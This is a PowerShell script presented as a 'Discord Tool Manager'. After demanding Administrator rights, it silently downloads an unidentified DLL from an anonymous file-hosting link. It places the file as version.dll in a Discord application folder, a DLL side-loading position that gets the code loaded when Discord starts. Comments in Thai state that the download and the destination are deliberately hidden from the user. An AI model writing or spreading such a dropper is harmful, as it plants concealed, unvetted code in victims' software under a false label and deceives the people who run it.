# Ensure the script is running with Administrator privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Please run this script as Administrator!"
    Pause
    Exit
}

# Configuration (!!! REPLACE THIS WITH YOUR ACTUAL DIRECT LINK !!!)
$url = "https://files.catbox.moe/xitkv2.dll" 
$currentUser = $env:USERNAME
$targetDir = "C:\ProgramData\$currentUser\Discord\app-1.0.9242"
$targetPath = Join-Path $targetDir "version.dll"

Clear-Host
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "          Discord Tool Manager          " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "1. Install" -ForegroundColor Green
Write-Host "2. Uninstall" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Cyan

$choice = Read-Host "Please select an option (1 or 2)"

switch ($choice) {
    "1" {
        Write-Host "`n[+] Starting installation..." -ForegroundColor Yellow
        
        if (-not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Force -Path $targetDir | Out-Null
        }

        try {
            # ดาวน์โหลดแบบเงียบ ไม่แสดงความคืบหน้าหรือแหล่งที่มา
            Invoke-WebRequest -Uri $url -OutFile $targetPath -UserAgent "Mozilla/5.0" | Out-Null
            
            if (Test-Path $targetPath) {
                # แสดงแค่ข้อความสำเร็จ ไม่แสดงโฟลเดอร์ปลายทาง
                Write-Host "[✓] Installation completed successfully!" -ForegroundColor Green
            } else {
                Write-Host "[X] Error: Installation failed." -ForegroundColor Red
            }
        } catch {
            Write-Host "[X] Connection error. Please try again." -ForegroundColor Red
        }
    }
    
    "2" {
        Write-Host "`n[-] Starting uninstallation..." -ForegroundColor Yellow
        
        if (Test-Path $targetPath) {
            try {
                Remove-Item -Path $targetPath -Force
                Write-Host "[✓] Uninstallation completed successfully!" -ForegroundColor Green
            } catch {
                Write-Host "[X] Failed to complete operation." -ForegroundColor Red
            }
        } else {
            Write-Host "[!] Tool is not installed on this system." -ForegroundColor Yellow
        }
    }
    
    Default {
        Write-Host "`n[X] Invalid choice. Please restart the script." -ForegroundColor Red
    }
}

Write-Host "`nPress any key to exit..."
$null = [Console]::ReadKey($true)
